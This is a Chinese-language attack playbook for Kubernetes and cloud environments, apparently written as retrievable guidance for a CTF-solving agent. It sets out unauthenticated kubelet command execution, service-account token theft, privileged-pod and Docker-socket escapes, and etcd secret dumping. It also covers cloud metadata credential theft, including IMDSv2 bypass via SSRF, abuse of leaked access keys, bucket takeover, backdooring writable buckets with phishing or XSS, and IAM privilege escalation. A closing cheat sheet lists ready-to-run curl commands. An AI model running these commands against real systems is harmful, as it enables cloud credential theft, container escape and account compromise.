# 云原生与容器/K8s 攻击手册

适用题型（命中即召回本手册）：Kubernetes K8s kubelet 10250 etcd apiserver 匿名访问 serviceaccount token 云存储 S3 OSS Azure Blob 枚举 读写误配置 aksk 泄露 云凭据 metadata 凭证文件 镜像仓库 未授权 docker 2375

## 1. 识别与分类
- K8s 判据：题面/响应出现 6443/10250/10255/2379 端口、/var/run/secrets/kubernetes.io/serviceaccount/token、kubeconfig、Pod 字样；命中即测三入口（apiserver 匿名 / kubelet 10250 / etcd 2379）。
- 云存储判据：响应、JS 或报错点名 <bucket>.s3.amazonaws.com / *.blob.core.windows.net / *.storage.googleapis.com / oss 域名，或 CNAME 指向上述存储域名。
- 云凭据判据：出现 169.254.169.254、100.100.100.200、metadata 字样，或前端/源码泄露 AKIA*/LTAI* 类 AccessKey 模式。

## 2. 攻击方法论
1. K8s apiserver：curl -sk https://APISERVER:6443/version /api /apis 探匿名；旧 8080 明文无鉴权直接 kubectl -s http://IP:8080 get pods。
2. kubelet 未授权：curl -sk https://NODE:10250/pods 列 Pod；curl -sk https://NODE:10250/run/NS/POD/CONTAINER -d "cmd=id" 直接 exec；10255 只读 /pods。
3. pod 内 SA token：读 /var/run/secrets/kubernetes.io/serviceaccount/{token,ca.crt,namespace}，Bearer 调 apiserver 做 auth can-i / selfsubjectrulesreviews；JWT 中段 base64 解码看 namespace/SA。
4. RBAC 提权：危险权限 = pods/exec、pods create、secrets get、serviceaccounts/token create、escalate、bind、impersonate；有 create pods → 提交 hostPID+hostNetwork+privileged+hostPath / 的特权 pod 逃逸宿主机。
5. etcd 2379：curl -sk https://ETCD:2379/version 探匿名；拿到 /etc/kubernetes/pki/etcd 证书后 etcdctl --cacert --cert --key get / --prefix --keys-only | grep secrets。
6. 云存储枚举：S3 curl -s https://<bucket>.s3.amazonaws.com/ → 200 列出/403 存在/404 不存在，aws s3 ls s3://<bucket>/ --no-sign-request；Azure curl "https://<bucket>.blob.core.windows.net/?restype=container&comp=list"；GCS curl https://<bucket>.storage.googleapis.com/；OSS 试 <bucket>.oss-<region>.aliyuncs.com。
7. aksk 泄露利用链：拿 AK/SK 后配工具（aws configure / ossutil config / coscmd config）→ 列桶读对象 → 试探写（put-bucket-acl --acl public-read、put-object）；SSRF→IMDS 拿临时凭据走同一链。
8. 云凭据 metadata：AWS IMDSv1 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/；IMDSv2 先 PUT /latest/api/token 带 X-aws-ec2-metadata-token-ttl-seconds；GCP 加 Metadata-Flavor: Google；Azure 加 Metadata: true；阿里 100.100.100.200、腾讯 metadata.tencentyun.com。
9. 镜像仓库与 docker daemon：curl http://TARGET:2375/version 探 Docker API 未授权；/containers/json 列容器、POST /containers/create 建 Binds["/:/host"]+Privileged 容器 chroot 逃逸；私有 registry 试 /v2/_catalog；docker pull 后 docker history --no-trunc 挖历史层硬编码密钥。
10. K8s 拉取 pull secret：kubectl get secrets --all-namespaces 里 type=kubernetes.io/dockerconfigjson 的 .dockerconfigjson base64 解码得 registry 账号。
11. 云 IAM 提权（拿到受限凭据后）：sts get-caller-identity 看身份 → 枚举策略 → 高危向量 iam:CreatePolicyVersion/AttachUserPolicy/PutUserPolicy（改写策略为 admin）、iam:PassRole+lambda:CreateFunction（代入高权限角色）、sts:AssumeRole（跨账户信任 Principal "*" 且无 ExternalId 可混替代入）。
12. 云服务账号进阶：EKS IRSA token 在 /var/run/secrets/eks.amazonaws.com/serviceaccount/token；GKE workload identity 与 AKS 的 AZURE_CLIENT_ID/AZURE_TENANT_ID 环境变量；拿到 token 后用 gcloud/az/aws 对应 CLI 枚举资源。

## 3. 变体与绕过
- IMDSv2 绕过：SSRF 用 302 重定向链、DNS rebinding 交替解析、请求走私注入 PUT token 请求；容器 hop limit 未收紧时可直接访问。
- 存储写误配置：ACL 全局 AllUsers/authenticatedUsers、Bucket Policy Principal "*" 无 Condition → 写对象/覆盖/挂马；Azure allowBlobPublicAccess=true 且容器匿名访问。
- 可写桶升级：公开可写桶 put-object 上传回连脚本、写 index.html 挂 XSS/钓鱼、覆盖前端 JS 实现持久化。
- 桶命名与区域：桶名全局唯一、S3 网站端点分区域；CNAME 指向已删桶（NoSuchBucket 404）可重建同名桶接管，403 说明资源仍在不可接管。
- K8s 网络策略绕过：DNS(53) 常放行可外带；hostNetwork:true 直接绕 pod 网络策略；找无 netpol 的 namespace 落脚。
- 旁路优先：kubelet 10250 / etcd 2379 不走 apiserver RBAC，RBAC 查无权限时优先打这两个旁路。

## 战法要点
- 先拿免费情报：题面/JS/报错点名的 bucket 名、key、端口、token 直接跟进，别盲扫。
- pod 内先 cat SA token + auth can-i，再决定建特权 pod 还是打 kubelet。
- K8s 三旁路（kubelet 10250 / etcd 2379 / API 8080）优先级高于 RBAC 硬提权。
- aksk 到手即配工具列桶读对象，先读后写（读最可能出 flag）。
- 云存储 403≠不存在，200 列表才是公开；拿到名字先 curl 一把确认存在性。
- 容器内先判别特权 (CapEff) / docker.sock / hostPID，再选逃逸链，不无脑建 pod。
- IAM 提权优先测 CreatePolicyVersion/PassRole/AssumeRole 三个"秒提权"向量，再铺开扫描。
- 镜像历史层与构建缓存常藏硬编码密钥，docker history --no-trunc 与 /v2/_catalog 是免费情报。

## 速查清单
```text
curl -sk https://NODE:10250/pods
curl -sk https://NODE:10250/run/NS/POD/CONTAINER -d "cmd=id"
curl -sk https://APISERVER:6443/api -k
curl -sk https://ETCD:2379/version
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -s --cacert ca.crt -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
curl -s https://<bucket>.s3.amazonaws.com/
aws s3 ls s3://<bucket>/ --no-sign-request
aws sts get-caller-identity
curl "https://<bucket>.blob.core.windows.net/?restype=container&comp=list"
curl -s https://<bucket>.storage.googleapis.com/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
curl http://TARGET:2375/version
docker history IMAGE --no-trunc
kubectl auth can-i --list
```
